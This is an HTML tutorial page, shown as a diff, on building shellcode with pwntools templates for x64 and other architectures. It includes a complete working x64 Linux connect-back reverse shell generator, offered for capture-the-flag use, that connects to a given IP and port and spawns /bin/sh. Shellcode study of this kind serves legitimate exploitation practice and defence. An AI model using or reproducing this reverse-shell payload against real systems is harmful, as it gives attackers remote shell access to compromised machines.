@@ -1,0 +1,211 @@
+<h1>Modern templates for Shellcoding</h1>
+<h2>The (not so) boring introduction</h2>
+<p>Assembly coding is a dark art, that I have practiced for almost 35 years. (I remember with emotion Michael Abrash books, <em>Zen of Assembly Language</em> )</p>
+<p>I started on <code>Z80</code> cpu, then <code>68000</code>, then <code>powerpc</code>, <code>x86</code>, <code>arm</code>, <code>mips</code>, <code>superh</code>, atmel <code>AVR</code>, <code>pic</code> microcontroller, <code>6502</code>, <code>8051</code>, recently <code>RiscV</code>, etc,etc...name it, I&#39;ve coded on it...</p>
+<p>Shellcoding can be seen as a subcategory of assembly coding, focused on binary exploitation, getting a shell, exfiltrating files, ..</p>
+<p>Like every pwner , I have my own collection of shellcodes for various architecture for the most common tasks in binary exploitation, portbind shell, reverse connection shell, readfile, stager, etc.</p>
+<p>Online you can find good collections of shellcodes on ShellStorm, or packetstormsecurity.com.</p>
+<p>One problem that arise when using these online various shellcodes,
+is that they use various assembly syntaxes, some use gas syntax, other nasm syntax, some are coded as C binary include, python binary hex string, various formats , incompatible between them...
+for ARM some use shellcode with armv7 opcodes, or armv5, sometimes they will work, sometimes crashes, depending on the processor..</p>
+<p>so to resume, for almost all these shellcodes you can find on internet, they are:</p>
+<ul>
+<li>not easy to compile</li>
+<li>not easy to debug</li>
+<li>not easy modify</li>
+<li>not easy run and test</li>
+</ul>
+<h2>Developping a modern template</h2>
+<p>In recent years, <a href="https://docs.pwntools.com/en/stable/#%5D">pwntools</a> has became the <em>de facto</em> standard tool for Pwners for developping exploits in python.</p>
+<p>It has some good functions for developping shellcodes, it also come with some already made shellcodes</p>
+<p>so for developping my own shellcodes, I have made various personnal templates that will try to resolve each of these problems.</p>
+<p>And that will permit to develop more complex shellcodes, debug them, produce an usable EXE with the shellcode, run it , eventually passing arguments to them to customize them.
+Then it will also dump them in various formats, ready to be used directly in your exploits.
+All these tasks with a single reusable template..</p>
+<h2>Prerequisites</h2>
+<p>First you will need to have a working installation of Pwntools</p>
+<p><a href="https://docs.pwntools.com/en/stable/install.html">Pwntools installation</a></p>
+<p>if you want to work with other architectures, you will need to install qemu,</p>
+<p>and the various cross-compilers necessary to compile binaries.</p>
+<p><a href="https://docs.pwntools.com/en/stable/qemu.html">Pwntools qemu</a></p>
+<p>Then all the classic debugging tools will be helpful too, <code>gdb</code>, <code>strace</code>, etc..</p>
+<p>last but not least , for debugging I will suggest you to install a gdb extension,</p>
+<p>like <a href="https://github.com/pwndbg/pwndbg">Pwndbg</a></p>
+<p>or <a href="https://hugsy.github.io/gef/">Gef</a>  (with eventually gef-extras too...)</p>
+<p>they will make your debugging life more easy..</p>
+<p>So let&#39;s start with a X86 basic template, to see how to use it.</p>
+<h2>X86 template example.</h2>
+<pre><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.log_level = <span class="hljs-string">&#x27;error&#x27;</span>
+context.terminal = [<span class="hljs-string">&#x27;xfce4-terminal&#x27;</span>, <span class="hljs-string">&#x27;--title=GDB-Pwn&#x27;</span>, <span class="hljs-string">&#x27;--zoom=0&#x27;</span>, <span class="hljs-string">&#x27;--geometry=128x98+1100+0&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>]
+<span class="hljs-comment">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]	# for command line terminal, launch tmux first before launching python code</span>
+context.update(arch=<span class="hljs-string">&quot;amd64&quot;</span>, os=<span class="hljs-string">&quot;linux&quot;</span>)
+
+<span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">1</span>):
+  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s [RUN or GDB or EXE]&#x27;</span> % (sys.argv[<span class="hljs-number">0</span>]))
+  exit(<span class="hljs-number">1</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">dumpit</span>(<span class="hljs-params">shellc</span>):
+  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;shellcode length: {:d} bytes&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(shellc)))
+  <span class="hljs-comment"># dump as hex number array</span>
+  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n\&quot;\\x{}\&quot;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;\\x&#x27;</span>.join([<span class="hljs-built_in">format</span>(b, <span class="hljs-string">&#x27;02x&#x27;</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(shellc)])))
+  <span class="hljs-comment"># dump as C array</span>
+  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nunsigned char shellc[] = {{{}}};&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;, &quot;</span>.join([<span class="hljs-built_in">format</span>(b, <span class="hljs-string">&#x27;#02x&#x27;</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(shellc)])))
+  <span class="hljs-comment"># dump as hex array</span>
+  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\npossibly problematic values are highlighted (00,0a,20)...\n&#x27;</span>)
+  <span class="hljs-built_in">print</span>(hexdump(shellc, highlight=<span class="hljs-string">b&#x27;\x0a\x20\x00&#x27;</span>))
+
+
+<span class="hljs-comment"># put your shellcode here</span>
+shellc = asm(<span class="hljs-string">&#x27;&#x27;&#x27;
+&#x27;&#x27;&#x27;</span>)
+
+dumpit(shellc)
+
+<span class="hljs-keyword">if</span> args.EXE:
+  ELF.from_bytes(shellc).save(<span class="hljs-string">&#x27;binary&#x27;</span>)
+
+<span class="hljs-keyword">if</span> args.RUN:
+  p = run_shellcode(shellc)
+  p.interactive()
+<span class="hljs-keyword">elif</span> args.GDB:
+  p = debug_shellcode(shellc, gdbscript=<span class="hljs-string">&#x27;&#x27;&#x27;
+    # set your pwndbg path here
+    source ~/gdb.plugins/pwndbg/gdbinit.py
+    context
+  &#x27;&#x27;&#x27;</span>)
+  p.interactive()
+</code></pre><p>First let&#39;s see some of the configuration options you have,
+at line 4, you have the <code>pwntools</code> settings <code>context.terminal</code> 
+with it, you can define what terminal will be used for debugging.
+in this example I used xfce4-terminal, and set it&#39;s exact position on screen, with his title, and with <code>zoom</code> option the font size..
+Setting the onscreen position and size, is important for multiscreen setup, and for easier debugging. You can choose the terminal you want.</p>
+<p>You can also use tmux if you want to debug in text terminal mode, with various split screen configurations</p>
+<p>That <code>context.terminal</code> option will be used when you will call the template, with the GDB command line option.</p>
+<p>In the last lines, you will have to set the <code>pwndbg</code> or <code>gef</code> config file path in the debug_shellcode()</p>
+<p>Ok let&#39;s try what this <code>context.terminal</code> options does, we will try the graphical term, than the text terminal, that will need to launch <code>tmux</code> first.. We use a simple <code>execve</code> shellcode for the test:</p>
+<p><img src="pics/example1.gif" alt=""></p>
+<p>so as you can see launching the template with GDB, will launch GDB in your choosen terminal program, for debugging your shellcode.</p>
+<p>the command line options are:</p>
+<ul>
+<li><em>GDB</em> , will launch gdb in a terminal windows to debug your shellcode</li>
+<li><em>EXE</em>,  will produce an elf executable from your shelcode, ready to upload and execute, or to strace to debug it</li>
+<li><em>RUN</em>,  will run the shellcode</li>
+</ul>
+<p>the EXE options could be use with GDB or RUN too..</p>
+<p>the <code>dumpit()</code> function python function will indicate you the total size in bytes of your shellcode,
+it will also output an binary hexdump of your shellcode, with bytes of hexadecimal values <code>00</code>, <code>0a</code>, <code>20</code> highlighted.
+That values could be problematic for some string functions overflow (<code>strcpy</code>, <code>sprintf</code>, etc..), so you will know if eventually your shellcode contains some of them..
+and last but not least...
+the <code>dumpit()</code> function will output your shellcode as a python hex string, or as a C program binary array, that you can copy/paste directly in your exploit..</p>
+<p>let&#39;s see this various options in action, still with a simple <code>execve</code> shellcode:</p>
+<p><img src="pics/example2.gif" alt=""></p>
+<h2>Various architectures templates</h2>
+<ul>
+<li><a href="./template.x64.py">Template for x86 64 bits</a></li>
+<li><a href="./template.arm.py">Template for arm 32 bits</a></li>
+<li><a href="./template.aarch64.py">Template for arm 64 bit, aarch64</a></li>
+<li><a href="./template.mips.py">Template for mips</a></li>
+</ul>
+<h2>passing arguments to your shellcode, and example</h2>
+<p>So, for example, you can also give some arguments to your shellcode, to customize it.</p>
+<p>As an example, I will share with you my <code>Connect Back Reverse Shellcode generator</code> that I use in ctf..</p>
+<p>it&#39;s 65bytes in x64, and contains no zeroes:</p>
+<p>you can use this syntax:</p>
+<pre><code class="hljs language-sh">python3 connect.back.reverse.shell.x64.without.zeroes.py &lt;IP&gt; &lt;PORT&gt; [RUN|GDB|EXE]
+</code></pre><p>you indicate the destination IP and port for connection, and you can RUN or DEBUG or produce an EXE..</p>
+<ul>
+<li><a href="./connect.back.reverse.shell.x64.without.zeroes.py">x64 Connect back shellcode generator</a></li>
+</ul>
+<pre><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> ctypes, struct, sys, os, socket
+
+context.update(arch=<span class="hljs-string">&quot;amd64&quot;</span>, os=<span class="hljs-string">&quot;linux&quot;</span>)
+context.terminal = [<span class="hljs-string">&#x27;xfce4-terminal&#x27;</span>, <span class="hljs-string">&#x27;--title=GDB-Pwn&#x27;</span>, <span class="hljs-string">&#x27;--zoom=0&#x27;</span>, <span class="hljs-string">&#x27;--geometry=128x98+1100+0&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>]
+<span class="hljs-comment">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]    # for command line terminal, launch tmux first before launching python code</span>
+context.log_level = <span class="hljs-string">&#x27;error&#x27;</span>
+
+<span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">3</span>):
+  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s &lt;IP&gt; &lt;PORT&gt; [RUN]&#x27;</span> % (sys.argv[<span class="hljs-number">0</span>]))
+  exit(<span class="hljs-number">1</span>)
+
+<span class="hljs-comment"># define HOST &amp; PORT here or in command line</span>
+IP, PORT = (sys.argv[<span class="hljs-number">1</span>], <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>],<span class="hljs-number">10</span>)) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">12490</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">sockaddr</span>():
+    family = struct.pack(<span class="hljs-string">&#x27;H&#x27;</span>, socket.AF_INET)
+    portbytes = struct.pack(<span class="hljs-string">&#x27;H&#x27;</span>, socket.htons(PORT))
+    ipbytes = socket.inet_aton(IP)
+    number = struct.unpack(<span class="hljs-string">&#x27;Q&#x27;</span>, family + portbytes + ipbytes)
+    number = -number[<span class="hljs-number">0</span>]        <span class="hljs-comment">#negate</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>((number + (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">64</span>)) % (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">64</span>))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">dumpit</span>(<span class="hljs-params">shellc</span>):
+  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;shellcode length: {:d} bytes&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(shellc)))
+  <span class="hljs-comment"># dump as hex number array</span>
+  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n\&quot;\\x{}\&quot;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;\\x&#x27;</span>.join([<span class="hljs-built_in">format</span>(b, <span class="hljs-string">&#x27;02x&#x27;</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(shellc)])))
+  <span class="hljs-comment"># dump as C array</span>
+  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nunsigned char shellc[] = {{{}}};&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;, &quot;</span>.join([<span class="hljs-built_in">format</span>(b, <span class="hljs-string">&#x27;#02x&#x27;</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(shellc)])))
+  <span class="hljs-comment"># dump as hex array</span>
+  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nproblematic values are highlighted (00,0a,20) check your IP,port...\n&#x27;</span>)
+  <span class="hljs-built_in">print</span>(hexdump(shellc, highlight=<span class="hljs-string">b&#x27;\x0a\x20\x00&#x27;</span>))
+
+shellc = asm (<span class="hljs-string">&#x27;&#x27;&#x27;
+socket:
+        push 41
+        pop rax
+        cdq
+        push 2
+        pop rdi
+        push 1
+        pop rsi
+	syscall
+connect:
+	xchg eax,edi
+	mov al,42
+        mov rcx,%s
+        neg rcx
+        push rcx
+        push rsp
+        pop rsi
+        mov dl,16
+        syscall
+dup2:
+	push 3
+        pop rsi
+dup2_loop:
+        mov al,33
+        dec esi
+        syscall
+        jnz dup2_loop
+execve:
+	cdq
+	push rdx
+	mov rcx, 0x68732f2f6e69622f
+	push rcx
+	push rsp
+	pop rdi
+	mov al, 59
+	syscall
+&#x27;&#x27;&#x27;</span> % (sockaddr()))
+
+
+dumpit(shellc)
+
+<span class="hljs-keyword">if</span> args.EXE:
+  ELF.from_bytes(shellc).save(<span class="hljs-string">&#x27;binary&#x27;</span>)
+
+<span class="hljs-keyword">if</span> args.RUN:
+  p = run_shellcode(shellc)
+  p.interactive()
+<span class="hljs-keyword">elif</span> args.GDB:
+  p = debug_shellcode(shellc, gdbscript=<span class="hljs-string">&#x27;&#x27;&#x27;
+    # set your pwndbg path here
+    source ~/gdb.plugins/pwndbg/gdbinit.py
+    context
+  &#x27;&#x27;&#x27;</span>)
+  p.interactive()
+</code></pre><h2>conclusion</h2>
+<p>Well I hope these templates will be useful to you,</p>
+<p>and that they will ease &amp; speed up your shellcode coding and debugging tasks..</p>
+<p>If you have an idea to ameliorate them, you can propose them, and if I like the idea, it will be added to the template..</p>
